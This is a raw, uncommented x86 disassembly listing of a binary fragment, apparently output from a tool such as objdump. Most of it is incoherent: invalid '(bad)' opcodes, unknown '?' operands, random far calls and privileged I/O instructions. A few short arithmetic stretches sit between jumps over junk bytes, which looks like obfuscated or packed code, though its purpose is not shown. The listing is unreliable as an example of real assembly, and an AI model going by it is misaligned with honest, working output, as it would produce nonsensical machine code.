  40cf5b:	or     dl,BYTE PTR [eax]
  40cf5d:	sub    eax,0x5f8a4842
  40cf62:	jle    0x40cf9a
  40cf64:	mov    edi,0xff87e9fa
  40cf69:	dec    esp
  40cf6a:	es jg  0x40cefc
  40cf6d:	mov    WORD PTR [edx-0x16],?
  40cf70:	xor    BYTE PTR [ecx],0x81
  40cf73:	adc    bh,ah
  40cf75:	loope  0x40cff2
  40cf77:	nop
  40cf78:	fs int3 
  40cf7a:	ja     0x40cf95
  40cf7c:	ficomp DWORD PTR [edx-0x5fe0ea04]
  40cf82:	cmp    edi,DWORD PTR [ebx+0x4]
  40cf85:	or     ecx,edi
  40cf87:	cmc    
  40cf88:	jb     0x40cf14
  40cf8a:	cwde   
  40cf8b:	fs shl al,1
  40cf8e:	cmp    DWORD PTR [esi+0x959333f],ebp
  40cf94:	sbb    DWORD PTR [edi+esi*4-0x6a07693f],edx
  40cf9b:	aad    0x4
  40cf9d:	data16 and bl,bl
  40cfa0:	add    DWORD PTR [ebx+0x4589b335],edi
  40cfa6:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	out    0xb2,al
  40cfca:	ror    BYTE PTR [edx+0x7e7e894c],0x3f
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40cfbb
  40cfd5:	xor    eax,0x7db531eb
  40cfda:	nop
  40cfdb:	jae    0x40cf7e
  40cfdd:	ins    BYTE PTR es:[edi],dx
  40cfde:	(bad)  
  40cfdf:	xor    al,0x9a
  40cfe1:	out    dx,eax
  40cfe2:	lahf   
  40cfe3:	mov    bl,0x41
  40cfe5:	frstor [eax]
  40cfe7:	pop    ss
  40cfe8:	int3   
  40cfe9:	cmp    DWORD PTR [ebx+0x5a217a73],0xc24354d1
  40cff3:	xchg   edi,eax
  40cff4:	shufps xmm4,XMMWORD PTR [eax+0x69054c16],0x9c
  40cffc:	and    BYTE PTR [ebp-0x38],ch
  40cfff:	ds cwd 
  40d002:	int3   
  40d003:	pop    ebp
  40d004:	or     ecx,DWORD PTR [esi-0x1]
  40d007:	dec    ebp
  40d008:	(bad)  
  40d009:	jmp    0xd4c47d69
  40d00e:	xor    al,0xec
  40d010:	je     0x40cfe9
  40d012:	ret    
  40d013:	push   ss
  40d014:	popa   
  40d015:	cmp    al,0xe4
  40d017:	sub    eax,0x8ccae9c5
  40d01c:	mov    BYTE PTR [ebx+0x14],bh
  40d01f:	mov    eax,ds:0xc95e4fe0
  40d024:	add    BYTE PTR ds:0x6c602205,ah
  40d02a:	adc    DWORD PTR ds:0x8a099495,esp
  40d030:	rcl    BYTE PTR [ecx+eiz*4],1
  40d033:	(bad)  
  40d034:	in     eax,dx
  40d035:	xchg   edx,eax
  40d036:	sbb    BYTE PTR [edi],ch
  40d038:	xor    ebp,0x673669c4
  40d03e:	xchg   DWORD PTR [ecx+0x6ccd2b85],ebp
  40d044:	push   ecx
  40d045:	adc    al,BYTE PTR [eax]
  40d047:	push   ecx
  40d048:	xlat   BYTE PTR ds:[ebx]
  40d049:	cmp    bl,cl
  40d04b:	mov    esi,cs
  40d04d:	(bad)  
  40d04e:	cmp    eax,0x57c1ef69
  40d053:	push   esp
  40d054:	or     ecx,DWORD PTR [edx+0x19]
  40d057:	mov    ds:0x72191c22,al
  40d05c:	loopne 0x40d0dc
  40d05e:	jbe    0x40d085
  40d060:	inc    ecx
  40d061:	cmp    BYTE PTR ds:0xdef41033,dl
  40d067:	pop    ebx
  40d068:	xor    dh,al
  40d06a:	pop    es
  40d06b:	cmp    eax,0x281c92b5
  40d070:	push   0x2331b164
  40d075:	sbb    dh,BYTE PTR [eax]
  40d077:	mov    edi,0x82883095
  40d07c:	xchg   esi,eax
  40d07d:	fst    QWORD PTR [edi+0x334eb007]
  40d084:	in     al,dx
  40d085:	or     BYTE PTR [eax+0x8],ah
  40d088:	lds    ecx,FWORD PTR [ebx+0x5e1038fa]
  40d08e:	mov    ah,0x30
  40d090:	adc    esp,DWORD PTR [eax+0x18abcf4b]
  40d096:	dec    esi
  40d097:	rol    BYTE PTR [ebx],1
  40d099:	rcl    DWORD PTR ds:[eax],0x7c
  40d09d:	jo     0x40d10f
  40d09f:	int3   
  40d0a0:	call   0x9300:0x905e17bc
  40d0a7:	fdivr  DWORD PTR [eax-0x541e0276]
  40d0ad:	int3   
  40d0ae:	addr16 mov ebp,0x9967c1be
  40d0b4:	pop    ebp
  40d0b5:	jle    0x40d099
  40d0b7:	pop    ecx
  40d0b8:	aad    0xb8
  40d0ba:	mov    bl,0xaa
  40d0bc:	std    
  40d0bd:	stos   DWORD PTR es:[edi],eax
  40d0be:	inc    eax
  40d0bf:	mov    al,ds:0xaef7d290
  40d0c4:	ret    
  40d0c5:	adc    cl,BYTE PTR [ebx+0xb6981f9]
  40d0cb:	sbb    DWORD PTR [edi-0x44ba388c],edx
  40d0d1:	lock cmp al,ah
  40d0d4:	sub    DWORD PTR [eax+0x28],edx
  40d0d7:	pop    es
  40d0d8:	mov    ebp,0x9407b18
  40d0dd:	push   es
  40d0de:	inc    eax
  40d0df:	rcl    DWORD PTR [eax+0x30],1
  40d0e2:	es push esp
  40d0e4:	xlat   BYTE PTR ds:[ebx]
  40d0e5:	or     ebp,DWORD PTR ds:0x1b00554
  40d0eb:	fs js  0x40d0af
  40d0ee:	xchg   edi,eax
  40d0ef:	ins    BYTE PTR es:[edi],dx
  40d0f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0f1:	mov    WORD PTR [ebx],cs
  40d0f3:	inc    ebx
  40d0f4:	pop    esp
  40d0f5:	ror    ebx,cl
  40d0f7:	mov    ecx,0x9600a68
  40d0fc:	sti    
  40d0fd:	call   0xe2cfe1bc
  40d102:	call   FWORD PTR [ebx+0x10]
  40d105:	(bad)  
  40d106:	push   esp
  40d107:	inc    ecx
  40d108:	push   ss
  40d109:	das    
  40d10a:	aaa    
  40d10b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d10c:	scas   al,BYTE PTR es:[edi]
  40d10d:	or     BYTE PTR [edi+0x47a61c53],ch
  40d113:	sbb    ebx,DWORD PTR [ebx+esi*1+0x84d8bd1]
  40d11a:	lea    ecx,[edx+ecx*1+0x32729d]
  40d121:	cmp    ecx,eax
  40d123:	je     0x40d712
  40d129:	mov    edi,DWORD PTR [ebp-0x18]
  40d12c:	mov    eax,DWORD PTR [ebp+0x8]
  40d12f:	mov    edx,DWORD PTR [ebp+0x14]
  40d132:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d136:	mov    ecx,0x7510856
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	cmp    BYTE PTR [eax-0x5f],0x10
  40d161:	loop   0x40d170
  40d163:	mov    edi,DWORD PTR [esi+0x7e]
  40d166:	aas    
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d164
  40d16b:	mov    cl,0x27
  40d16d:	sbb    eax,0x52ec5030
  40d172:	xchg   ebp,eax
  40d173:	mov    bh,0xe7
  40d175:	dec    edi
  40d176:	test   BYTE PTR [esi-0x17],al
  40d179:	inc    ebx
  40d17a:	data16 scas al,BYTE PTR es:[edi]
  40d17c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d17d:	lahf   
  40d17e:	and    dh,ah
  40d180:	mov    ebp,0xd301218a
  40d185:	aaa    
  40d186:	fisub  WORD PTR [edi]
  40d188:	sbb    al,0x9b
  40d18a:	jb     0x40d1b1
  40d18c:	sub    edx,0x7c0fc211
  40d192:	dec    esp
  40d193:	ret    
  40d194:	fstp   st(2)
  40d196:	mov    ebx,0x71d36e07
  40d19b:	call   0x4ac3:0x370bf7d9
  40d1a2:	mov    bl,0x50
  40d1a4:	fcom   QWORD PTR [ebx-0x580b5889]
  40d1aa:	inc    edi
  40d1ab:	stos   DWORD PTR es:[edi],eax
  40d1ac:	and    DWORD PTR [edi+0x3a],edx
  40d1af:	imul   eax,DWORD PTR [esi],0x6086d9a4
  40d1b5:	push   ebx
  40d1b6:	mov    eax,ds:0xb44291f2
  40d1bb:	aaa    
  40d1bc:	mov    eax,ds:0x83d5eefe
  40d1c1:	faddp  st(7),st
  40d1c5:	adc    esi,DWORD PTR [ebp+0x6f]
  40d1c8:	fisubr DWORD PTR [edx+0x6f]
  40d1cb:	cmp    eax,0x226c4b3
  40d1d0:	cld    
  40d1d1:	mov    al,ah
  40d1d3:	loope  0x40d216
  40d1d5:	es out 0x26,eax
  40d1d8:	jle    0x40d1da
  40d1da:	xor    dl,dl
  40d1dc:	mov    WORD PTR [esi+0x639f5276],ss
  40d1e2:	cld    
  40d1e3:	and    eax,0x241196c0
  40d1e8:	mov    al,0xa5
  40d1ea:	push   cs
  40d1eb:	hlt    
  40d1ec:	ja     0x40d1d1
  40d1ee:	mov    ah,0xa3
  40d1f0:	inc    esp
  40d1f1:	nop
  40d1f2:	jae    0x40d25f
  40d1f4:	and    eax,0x6efde09c
  40d1f9:	cdq    
  40d1fa:	je     0x40d1e3
  40d1fc:	inc    ecx
  40d1fd:	mov    edx,0x905d7083
  40d202:	test   BYTE PTR [edi],dl
  40d204:	fimul  DWORD PTR [ecx+0x9]
  40d207:	dec    ebx
  40d208:	ja     0x40d232
  40d20a:	mov    al,ds:0x94afa2f5
  40d20f:	mov    esi,0x6dbbc236
  40d214:	repnz xlat BYTE PTR ds:[ebx]
  40d216:	push   esi
  40d217:	sbb    DWORD PTR [edx-0x356ae151],eax
  40d21d:	cdq    
  40d21e:	scas   al,BYTE PTR es:[edi]
  40d21f:	mov    dh,0x6f
  40d221:	mov    al,ds:0x98361611
  40d226:	inc    ebp
  40d227:	cmp    al,0xb9
  40d229:	cmp    BYTE PTR [edx],dl
  40d22b:	sub    dh,BYTE PTR [ecx+0x27]
  40d22e:	test   bh,bl
  40d230:	rcl    BYTE PTR es:[ebx],1
  40d233:	jbe    0x40d1cc
  40d235:	xchg   ecx,eax
  40d236:	inc    edx
  40d237:	ror    BYTE PTR [esi],cl
  40d239:	popf   
  40d23a:	pop    ds
  40d23b:	mov    es:0x121e4ed8,al
  40d241:	cmp    al,0x40
  40d243:	inc    ebp
  40d244:	mov    eax,ds:0x8e6b2ba
  40d249:	dec    edi
  40d24a:	push   eax
  40d24b:	inc    eax
  40d24c:	into   
  40d24d:	loop   0x40d2ac
  40d24f:	ja     0x40d2c3
  40d251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d252:	pop    ebp
  40d253:	push   edi
  40d254:	inc    edi
  40d255:	inc    ebx
  40d256:	call   0xbf0c:0xd87ffc85
  40d25d:	push   ss
  40d25e:	xchg   ecx,eax
  40d25f:	fimul  WORD PTR [ebx]
  40d261:	imul   edi,DWORD PTR [ebx-0x6c59fd07],0xd3c71b6f
  40d26b:	popf   
  40d26c:	xchg   esi,eax
  40d26d:	cld    
  40d26e:	or     eax,0x7047dc16
  40d273:	pop    edi
  40d274:	cmp    esp,edx
  40d276:	xor    ah,BYTE PTR [esi]
  40d278:	fwait
  40d279:	es loopne 0x40d2c0
  40d27c:	out    dx,eax
  40d27d:	cmp    al,0x6d
  40d27f:	push   ebp
  40d280:	xchg   edx,eax
  40d281:	mov    cs,ecx
  40d283:	and    DWORD PTR [esi],eax
  40d285:	mov    bh,0xd2
  40d287:	mov    bl,0x15
  40d289:	outs   dx,BYTE PTR ds:[esi]
  40d28a:	(bad)  
  40d28b:	mov    al,0xfe
  40d28d:	inc    ecx
  40d28e:	enter  0x2d59,0x9f
  40d292:	adc    DWORD PTR [edx+0x39573918],esp
  40d298:	lahf   
  40d299:	pop    ecx
  40d29a:	call   ebp
  40d29c:	adc    DWORD PTR [ebp-0x210a5031],ecx
  40d2a2:	add    eax,eax
  40d2a4:	or     BYTE PTR [ebx+0x2b53600d],0xc8
  40d2ab:	lea    eax,[edx+eax*1+0x32729d]
  40d2b2:	mov    edx,DWORD PTR [ebp+0x8]
  40d2b5:	mov    edi,DWORD PTR [ebp-0x24]
  40d2b8:	mov    DWORD PTR [edi+edx*4],eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	sub    BYTE PTR [ebx-0x733105c8],dh
  40d2e7:	jle    0x40d367
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d2b6
  40d2ee:	and    cl,dl
  40d2f0:	inc    ecx
  40d2f1:	push   ds
  40d2f2:	xor    al,0xc
  40d2f4:	xor    ebp,ebp
  40d2f6:	ds cld 
  40d2f8:	dec    eax
  40d2f9:	lods   al,BYTE PTR ds:[esi]
  40d2fa:	push   ss
  40d2fb:	jl     0x40d2da
  40d2fd:	sub    eax,0xeeba90db
  40d302:	(bad)  [ecx]
  40d304:	in     eax,dx
  40d305:	leave  
  40d306:	pusha  
  40d307:	(bad)  
  40d309:	out    0x32,eax
  40d30b:	je     0x40d389
  40d30d:	aad    0x68
  40d30f:	div    DWORD PTR [ebx]
  40d311:	dec    ebp
  40d312:	jnp    0x40d31e
  40d314:	clc    
  40d315:	and    al,0x39
  40d317:	mov    bl,0x7d
  40d319:	fisttp DWORD PTR [ebx-0x4eaf1c50]
  40d31f:	aad    0x8c
  40d321:	push   eax
  40d322:	mov    bh,0xc1
  40d324:	push   cs
  40d325:	sbb    ecx,DWORD PTR [eax+esi*4]
  40d328:	loopne 0x40d33c
  40d32a:	fisub  WORD PTR [ebp+0x38]
  40d32d:	cmp    bl,bl
  40d32f:	push   esp
  40d330:	fbstp  TBYTE PTR [ebx]
  40d332:	in     eax,dx
  40d333:	bound  edx,QWORD PTR ds:0x9f8ebbb2
  40d339:	arpl   WORD PTR [eax],sp
  40d33b:	mov    dh,0xd9
  40d33d:	mov    dl,0x80
  40d33f:	sub    DWORD PTR [ecx-0xa],edi
  40d342:	inc    eax
  40d343:	pop    ecx
  40d344:	xchg   DWORD PTR [edx],esi
  40d346:	int    0x63
  40d348:	add    BYTE PTR [ebp-0x449dcd68],al
  40d34e:	cmp    DWORD PTR [edx+0x2101f879],eax
  40d354:	jg     0x40d392
  40d356:	loope  0x40d2d9
  40d358:	(bad)  
  40d359:	fwait
  40d35a:	dec    eax
  40d35b:	(bad)  
  40d35c:	mov    ds:0x653d6a60,al
  40d361:	loop   0x40d389
  40d363:	inc    bh
  40d365:	mov    ah,0x87
  40d367:	ret    0xcde0
  40d36a:	add    eax,0xb50e0c33
  40d36f:	imul   ebp,DWORD PTR [edx+0x19],0xaa295e9e
  40d376:	outs   dx,DWORD PTR ds:[esi]
  40d377:	repnz fcmovnbe st,st(3)
  40d37a:	sti    
  40d37b:	lahf   
  40d37c:	iret   
  40d37d:	pop    ebx
  40d37e:	sbb    eax,0x574acafb
  40d383:	inc    esi
  40d384:	adc    eax,0x7192157c
  40d389:	or     eax,0x2ccb92de
  40d38e:	shl    DWORD PTR [ebx+esi*1+0x18e21d70],cl
  40d395:	and    DWORD PTR [edi],esp
  40d397:	test   al,0xb4
  40d399:	push   ecx
  40d39a:	int3   
  40d39b:	jo     0x40d3c5
  40d39d:	mov    ch,0xd
  40d39f:	push   ecx
  40d3a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3a1:	pop    ecx
  40d3a2:	pop    ds
  40d3a3:	add    ebx,DWORD PTR [ebp+0x1e7fa5ed]
  40d3a9:	enter  0xec,0x3
  40d3ad:	fstp   DWORD PTR [eax]
  40d3af:	mov    al,ds:0xb3cb1c43
  40d3b4:	sbb    dh,BYTE PTR [esi+edi*4]
  40d3b7:	jge    0x40d3aa
  40d3b9:	cmp    al,0x18
  40d3bb:	nop
  40d3bc:	nop
  40d3bd:	pop    cx
  40d3bf:	jb     0x40d3b5
  40d3c1:	sbb    BYTE PTR [ebx+0x5c],dl
  40d3c4:	nop
  40d3c5:	ds cmp esi,eax
  40d3c8:	rol    BYTE PTR [ecx*2-0x64d785a5],cl
  40d3cf:	(bad)  
  40d3d0:	dec    ecx
  40d3d1:	push   cs
  40d3d2:	jnp    0x40d3a0
  40d3d4:	adc    DWORD PTR [edi],0x7df17334
  40d3da:	retf   
  40d3db:	div    DWORD PTR fs:[ebx+ebp*2+0xe]
  40d3e0:	jle    0x40d416
  40d3e2:	sub    eax,0xd8b5b5ed
  40d3e7:	out    dx,eax
  40d3e8:	in     eax,dx
  40d3e9:	sar    al,1
  40d3eb:	(bad)  
  40d3ec:	mov    esp,0x2ce8dd85
  40d3f1:	fnstenv [ecx+0x474c9782]
  40d3f7:	les    ebp,FWORD PTR [edi]
  40d3f9:	add    ch,BYTE PTR [esi+0x7d]
  40d3fc:	xchg   esi,eax
  40d3fd:	mov    eax,0x403abe09
  40d402:	(bad)  [ebx+0xa]
  40d405:	in     eax,0x96
  40d407:	popf   
  40d408:	rol    bh,1
  40d40a:	and    al,0xd8
  40d40c:	imul   esi,DWORD PTR [eax+0x3e],0x94700a23
  40d413:	loope  0x40d462
  40d415:	bound  ecx,QWORD PTR [eax+0x63]
  40d418:	repnz fstp QWORD PTR [esi+0x68782752]
  40d41f:	inc    edi
  40d420:	dec    ebp
  40d421:	push   0x55
  40d423:	xchg   esi,eax
  40d424:	int    0x93
  40d426:	dec    ecx
  40d427:	mov    DWORD PTR [eax],eax
  40d429:	ror    BYTE PTR [esi-0x7496789b],1
  40d42f:	push   ebp
  40d430:	adc    al,0x33
  40d432:	rol    DWORD PTR [ebx],0xc6
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	shl    DWORD PTR [ecx],cl
  40d44b:	(bad)  
  40d44c:	mov    ecx,DWORD PTR [edi+0x3f7e7e8d]
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d455
  40d456:	mov    bl,0x94
  40d458:	mov    ah,0x7c
  40d45a:	and    bh,ah
  40d45c:	fisttp DWORD PTR [edi+0x49fa4b4e]
  40d462:	and    DWORD PTR [esi-0x21],0x33
  40d466:	sbb    DWORD PTR [edi+0x4c02870e],esp
  40d46c:	out    0x44,al
  40d46e:	and    DWORD PTR [ecx+eax*4],edx
  40d471:	leave  
  40d472:	push   0x1e90c9e0
  40d477:	fmul   DWORD PTR [esp+ebx*4-0x589bca50]
  40d47e:	sbb    al,0x41
  40d480:	dec    ecx
  40d481:	cmp    BYTE PTR ds:0x9a57b144,ch
  40d487:	mov    ebp,0xdbbcb2
  40d48c:	stos   BYTE PTR es:[edi],al
  40d48d:	outs   dx,DWORD PTR ds:[esi]
  40d48e:	and    BYTE PTR [ebx-0x41a5c95c],cl
  40d494:	pop    ds
  40d495:	mov    WORD PTR [eax],cs
  40d497:	sub    al,0x5c
  40d499:	(bad)  
  40d49a:	into   
  40d49b:	push   ebp
  40d49c:	or     esi,ebx
  40d49e:	out    dx,eax
  40d49f:	push   ecx
  40d4a0:	pop    ebp
  40d4a1:	cld    
  40d4a2:	into   
  40d4a3:	push   edx
  40d4a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4a5:	xor    dl,BYTE PTR [ebp+0x493f422e]
  40d4ab:	lods   al,BYTE PTR ds:[esi]
  40d4ac:	bound  esp,QWORD PTR [ebp+0x1858fc3d]
  40d4b2:	shl    DWORD PTR [edi+0x2a],1
  40d4b5:	dec    edi
  40d4b6:	mov    bh,0xfd
  40d4b8:	inc    esi
  40d4b9:	test   DWORD PTR ds:0x2a0a02f3,esi
  40d4bf:	mov    ecx,0x38477db
  40d4c4:	sub    DWORD PTR [edx],edi
  40d4c6:	dec    edx
  40d4c7:	pop    esi
  40d4c8:	mov    ds:0xba42ee14,eax
  40d4cd:	adc    al,0xd9
  40d4cf:	adc    BYTE PTR [ebx],bl
  40d4d1:	mov    ah,0x22
  40d4d3:	pushf  
  40d4d4:	outs   dx,BYTE PTR ds:[esi]
  40d4d5:	icebp  
  40d4d6:	shr    eax,0xcc
  40d4d9:	push   edi
  40d4da:	stos   BYTE PTR es:[edi],al
  40d4db:	dec    BYTE PTR [ebx-0x5e3e410e]
  40d4e1:	push   ss
  40d4e2:	sub    esp,esp
  40d4e4:	inc    edi
  40d4e5:	xor    eax,0xda815425
  40d4ea:	sub    eax,0xbb4da2a5
  40d4ef:	rcr    DWORD PTR [edi-0x1bf93660],cl
  40d4f5:	ret    
  40d4f6:	push   esi
  40d4f7:	xor    edi,esi
  40d4f9:	pop    esp
  40d4fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4fb:	sub    ecx,DWORD PTR [ecx-0x11]
  40d4fe:	sbb    bl,bh
  40d500:	je     0x40d487
  40d502:	mov    eax,ds:0x1e4b6097
  40d507:	and    al,BYTE PTR [esi]
  40d509:	cmp    al,0x40
  40d50b:	xchg   esi,eax
  40d50c:	sub    eax,0x5f2cf0f8
  40d511:	es add eax,0x34d38753
  40d517:	int    0xe1
  40d519:	adc    BYTE PTR [edi+0x3d],0x7e
  40d51d:	jbe    0x40d52b
  40d51f:	ja     0x40d530
  40d521:	jb     0x40d4dd
  40d523:	mov    ds:0x8b4d5d96,al
  40d528:	test   al,0x7
  40d52a:	ja     0x40d4cb
  40d52c:	and    eax,0xdbe30af2
  40d531:	jno    0x40d4bc
  40d533:	jbe    0x40d4e1
  40d535:	cmp    BYTE PTR [esi-0x37aa9582],ch
  40d53b:	mov    ecx,0x396c3978
  40d540:	sbb    eax,0x769cb05a
  40d545:	adc    dl,ah
  40d547:	mov    BYTE PTR [ebx],0x50
  40d54a:	retf   0xd286
  40d54d:	rcr    BYTE PTR [edi-0x3a],0x98
  40d551:	cmp    eax,0x70e4b878
  40d556:	push   cs
  40d557:	jb     0x40d595
  40d559:	shl    DWORD PTR [edx],0xdb
  40d55c:	aaa    
  40d55d:	pop    eax
  40d55e:	mov    cl,0xb0
  40d560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d561:	sbb    al,BYTE PTR [ecx+eax*1]
  40d564:	xor    esi,eax
  40d566:	jle    0x40d581
  40d568:	ror    BYTE PTR [edx],0xb4
  40d56b:	mov    ch,0x0
  40d56d:	retf   0x9910
  40d570:	ins    BYTE PTR es:[edi],dx
  40d571:	cwde   
  40d572:	push   0xe53a8604
  40d577:	repnz push esp
  40d579:	aad    0x7f
  40d57b:	pop    es
  40d57c:	(bad)  
  40d57d:	(bad)  
  40d57e:	jnp    0x40d510
  40d580:	push   eax
  40d581:	shl    BYTE PTR fs:[ebx-0x6d],cl
  40d585:	dec    eax
  40d586:	into   
  40d587:	xchg   BYTE PTR [ebp-0x23],ch
  40d58a:	xchg   BYTE PTR [ecx],cl
  40d58c:	fwait
  40d58d:	sbb    esp,DWORD PTR [edx-0xa]
  40d590:	in     al,dx
  40d591:	xchg   edx,eax
  40d592:	pop    ecx
  40d593:	pusha  
  40d594:	fisub  WORD PTR ds:0xe9fc558b
  40d59a:	pop    ecx
  40d59b:	add    DWORD PTR [eax],eax
  40d59d:	add    bh,ah
  40d59f:	idiv   DWORD PTR [edx]
  40d5a1:	push   ss
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xce41fe4c
  40d5ac:	push   edx
  40d5ad:	fs inc eax
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d55e
  40d5b7:	xchg   ecx,eax
  40d5b8:	clc    
  40d5b9:	adc    al,al
  40d5bb:	fisubr WORD PTR [edx+0x7d6381d]
  40d5c1:	sub    eax,0xd4e940c9
  40d5c6:	push   DWORD PTR gs:[ebp+0x2221ee23]
  40d5cd:	ffree  st(0)
  40d5cf:	pop    ebx
  40d5d0:	out    dx,al
  40d5d1:	sti    
  40d5d2:	push   ebx
  40d5d3:	repz jno 0x40d5ca
  40d5d6:	sub    DWORD PTR [edi-0x26],0x37f96351
  40d5dd:	add    bl,BYTE PTR [ebp+0x3d]
  40d5e0:	in     al,0x78
  40d5e2:	pop    ecx
  40d5e3:	sub    eax,0xe4d883fc
  40d5e8:	mov    dh,0x4c
  40d5ea:	daa    
  40d5eb:	fs int 0xc5
  40d5ee:	shr    BYTE PTR [edx+eiz*2],1
  40d5f1:	xchg   ebp,eax
  40d5f2:	cmp    al,0x1a
  40d5f4:	lods   eax,DWORD PTR ds:[esi]
  40d5f5:	leave  
  40d5f6:	adc    ebp,edi
  40d5f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5f9:	aad    0x7d
  40d5fb:	mov    al,ds:0x40327b94
  40d600:	add    al,0x89
  40d602:	stc    
  40d603:	push   cs
  40d604:	call   0xdfd8a119
  40d609:	sub    eax,0xad045719
  40d60e:	imul   DWORD PTR [edx-0x4c3a658e]
  40d614:	hlt    
  40d615:	add    edi,DWORD PTR [esi]
  40d617:	xchg   edi,eax
  40d618:	sbb    eax,0xb7555c22
  40d61d:	in     eax,0xfd
  40d61f:	mov    WORD PTR [esi],?
  40d621:	pop    esi
  40d622:	hlt    
  40d623:	hlt    
  40d624:	sbb    BYTE PTR [ecx-0x77],ah
  40d627:	mov    esp,cs
  40d629:	pop    ss
  40d62a:	loopne 0x40d5e8
  40d62c:	lods   al,BYTE PTR ds:[esi]
  40d62d:	cmp    al,0x18
  40d62f:	adc    eax,0xa6ed800d
  40d634:	popa   
  40d635:	jns    0x40d5ba
  40d637:	push   eax
  40d638:	push   edi
  40d639:	dec    edx
  40d63a:	xor    esi,DWORD PTR ss:[esi+0x6bfc4f3]
  40d641:	mov    ch,0xc
  40d643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d644:	adc    al,BYTE PTR [ecx-0x4ad5ed30]
  40d64a:	inc    edi
  40d64b:	pop    ss
  40d64c:	lock sub DWORD PTR [edi],eax
  40d64f:	cmp    al,0x8
  40d651:	jle    0x40d619
  40d653:	ins    BYTE PTR es:[edi],dx
  40d654:	ret    0x12cd
  40d657:	iret   
  40d658:	push   esi
  40d659:	out    dx,al
  40d65a:	pop    ds
  40d65b:	dec    ebx
  40d65c:	daa    
  40d65d:	jb     0x40d67a
  40d65f:	nop
  40d660:	js     0x40d654
  40d662:	mov    ah,BYTE PTR [esi+0x68b9ebbf]
  40d668:	adc    DWORD PTR [eax],esi
  40d66a:	clc    
  40d66b:	pop    edx
  40d66c:	ret    
  40d66d:	xor    ecx,DWORD PTR [eax+eax*1-0x39]
  40d671:	sub    eax,0xaa857d8c
  40d676:	push   ebx
  40d677:	scas   al,BYTE PTR es:[di]
  40d679:	lock mov DWORD PTR [ebx],edi
  40d67c:	xchg   BYTE PTR [edx],bh
  40d67e:	or     BYTE PTR [esp+ebp*1+0x63],dl
  40d682:	ja     0x40d66a
  40d684:	add    al,0xa3
  40d686:	int    0x81
  40d688:	(bad)  
  40d689:	cmp    BYTE PTR [ecx+0x67adab95],bl
  40d68f:	ja     0x40d656
  40d691:	xchg   ebp,eax
  40d692:	jb     0x40d6d8
  40d694:	mov    bl,0x77
  40d696:	jmp    0x3c19:0x235acab5
  40d69d:	xlat   BYTE PTR ds:[ebx]
  40d69e:	lock out dx,eax
  40d6a0:	sbb    al,BYTE PTR [esi-0x7a]
  40d6a3:	in     al,dx
  40d6a4:	mov    edx,0xc1598b94
  40d6a9:	cdq    
  40d6aa:	cmp    DWORD PTR [ebx+0x457c8e62],eax
  40d6b0:	mov    ecx,0x50c4517d
  40d6b5:	push   ds
  40d6b6:	cmc    
  40d6b7:	enter  0x561d,0xbe
  40d6bb:	mov    ecx,0x82aa5c52
  40d6c0:	pop    ecx
  40d6c1:	cmc    
  40d6c2:	outs   dx,DWORD PTR ds:[esi]
  40d6c3:	push   edx
  40d6c4:	xor    al,0x91
  40d6c6:	xchg   ebx,eax
  40d6c7:	xchg   ebp,eax
  40d6c8:	and    edx,ebx
  40d6ca:	ins    DWORD PTR es:[edi],dx
  40d6cb:	jae    0x40d6a0
  40d6cd:	mov    edi,0xdb7b9539
  40d6d2:	or     BYTE PTR [eax+0x7d],ah
  40d6d5:	lea    eax,[edx-0xe124736]
  40d6db:	sub    ah,ch
  40d6dd:	push   cs
  40d6de:	adc    BYTE PTR [edi],0x6
  40d6e1:	xor    cl,dh
  40d6e3:	push   ss
  40d6e4:	push   ds
  40d6e5:	jmp    0x40d70e
  40d6e7:	mov    ah,0x86
  40d6e9:	push   ss
